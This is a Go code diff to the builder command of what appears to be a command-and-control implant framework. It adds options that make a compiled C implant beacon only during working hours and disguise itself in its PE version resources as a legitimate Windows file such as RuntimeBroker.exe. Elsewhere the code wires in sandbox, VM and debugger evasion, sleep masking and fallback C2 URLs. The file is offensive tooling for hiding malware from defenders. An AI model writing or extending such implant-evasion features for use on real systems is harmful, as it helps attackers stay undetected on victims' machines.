@@ -172,6 +172,17 @@ func init() {
 	stagelessCmd.Flags().String("lang", "go", "Implant language: go|c  (c = C/ASM MinGW build)")
 	stagelessCmd.Flags().String("fallback-urls", "", "Comma-separated fallback C2 URLs (C implant only)")
 	stagelessCmd.Flags().String("output", "", "Output file path")
+	// ── C implant: working-hours ──────────────────────────────────────────────
+	stagelessCmd.Flags().Bool("work-hours", false, "Only beacon during working hours (C implant only)")
+	stagelessCmd.Flags().Int("work-start", 8, "Working hours start, 24h (C implant only)")
+	stagelessCmd.Flags().Int("work-end", 18, "Working hours end, 24h (C implant only)")
+	// ── C implant: PE masquerade overrides (all override --profile) ───────────
+	stagelessCmd.Flags().String("masq-company", "", "PE version-resource company name")
+	stagelessCmd.Flags().String("masq-product", "", "PE version-resource product name")
+	stagelessCmd.Flags().String("masq-desc", "", "PE version-resource file description")
+	stagelessCmd.Flags().String("masq-orig", "", "PE version-resource OriginalFilename (e.g. RuntimeBroker.exe)")
+	stagelessCmd.Flags().String("masq-internal", "", "PE version-resource InternalName (default: masq-orig minus .exe)")
+	stagelessCmd.Flags().String("masq-ver", "", "PE version string, e.g. 10.0.19041.1")
 	_ = stagelessCmd.MarkFlagRequired("c2")
 	_ = stagelessCmd.MarkFlagRequired("key")
 }
@@ -195,6 +206,16 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	lang, _ := cmd.Flags().GetString("lang")
 	fallbackURLs, _ := cmd.Flags().GetString("fallback-urls")
 	output, _ := cmd.Flags().GetString("output")
+	// C-implant-specific flags
+	workHours, _ := cmd.Flags().GetBool("work-hours")
+	workStart, _ := cmd.Flags().GetInt("work-start")
+	workEnd, _ := cmd.Flags().GetInt("work-end")
+	masqCompany, _ := cmd.Flags().GetString("masq-company")
+	masqProduct, _ := cmd.Flags().GetString("masq-product")
+	masqDesc, _ := cmd.Flags().GetString("masq-desc")
+	masqOrig, _ := cmd.Flags().GetString("masq-orig")
+	masqInternal, _ := cmd.Flags().GetString("masq-internal")
+	masqVer, _ := cmd.Flags().GetString("masq-ver")
 
 	var profile *OpsecProfile
 	if profilePath != "" {
@@ -251,15 +272,80 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 			EnableEvasion: evasion,
 			SleepMasking:  sleepMask,
 			FallbackURLs:  fallbackURLs,
+			C2Profile:     c2ProfileName,
+			WorkHoursOnly: workHours,
+			WorkStart:     workStart,
+			WorkEnd:       workEnd,
 			Debug:         false,
 			OutputDir:     outDir,
 			OutputName:    outName,
 		}
+
 		if profile != nil {
+			// Profile overrides CLI behaviour flags
+			cCfg.IntervalSec   = int(profile.SleepInterval.Seconds())
+			cCfg.JitterPct     = profile.JitterPercent
+			cCfg.MaxRetries    = profile.MaxRetries
+			cCfg.KillDate      = profile.KillDate
+			cCfg.ExecMethod    = profile.ExecMethod
+			cCfg.EnableEvasion = profile.EnableSandboxCheck || profile.EnableVMCheck || profile.EnableDebugCheck
+			cCfg.SleepMasking  = profile.SleepMasking
 			cCfg.WorkHoursOnly = profile.WorkingHoursOnly
-			cCfg.WorkStart = profile.WorkingHoursStart
-			cCfg.WorkEnd = profile.WorkingHoursEnd
+			cCfg.WorkStart     = profile.WorkingHoursStart
+			cCfg.WorkEnd       = profile.WorkingHoursEnd
+
+			// Profile masquerade (CLI --masq-* flags below take precedence)
+			if profile.Masquerade.Enabled {
+				if masqCompany == "" {
+					cCfg.MasqCompany = profile.Masquerade.Company
+				}
+				if masqProduct == "" {
+					cCfg.MasqProduct = profile.Masquerade.Product
+				}
+				if masqDesc == "" {
+					cCfg.MasqDesc = profile.Masquerade.Description
+				}
+				if masqOrig == "" {
+					cCfg.MasqOrigFile = profile.Masquerade.OriginalFilename
+					cCfg.MasqInternal = strings.TrimSuffix(profile.Masquerade.OriginalFilename, ".exe")
+				}
+				if masqVer == "" && profile.Masquerade.Version != "" {
+					ms, ls := parseVersion(profile.Masquerade.Version)
+					cCfg.MasqVerMajor = int(ms >> 16)
+					cCfg.MasqVerMinor = int(ms & 0xFFFF)
+					cCfg.MasqVerBuild = int(ls >> 16)
+					cCfg.MasqVerRev   = int(ls & 0xFFFF)
+				}
+			}
 		}
+
+		// CLI --masq-* flags always override profile
+		if masqCompany != "" {
+			cCfg.MasqCompany = masqCompany
+		}
+		if masqProduct != "" {
+			cCfg.MasqProduct = masqProduct
+		}
+		if masqDesc != "" {
+			cCfg.MasqDesc = masqDesc
+		}
+		if masqOrig != "" {
+			cCfg.MasqOrigFile = masqOrig
+			if masqInternal == "" {
+				cCfg.MasqInternal = strings.TrimSuffix(masqOrig, ".exe")
+			}
+		}
+		if masqInternal != "" {
+			cCfg.MasqInternal = masqInternal
+		}
+		if masqVer != "" {
+			ms, ls := parseVersion(masqVer)
+			cCfg.MasqVerMajor = int(ms >> 16)
+			cCfg.MasqVerMinor = int(ms & 0xFFFF)
+			cCfg.MasqVerBuild = int(ls >> 16)
+			cCfg.MasqVerRev   = int(ls & 0xFFFF)
+		}
+
 		result, err := BuildC(cCfg)
 		if err != nil {
 			return err
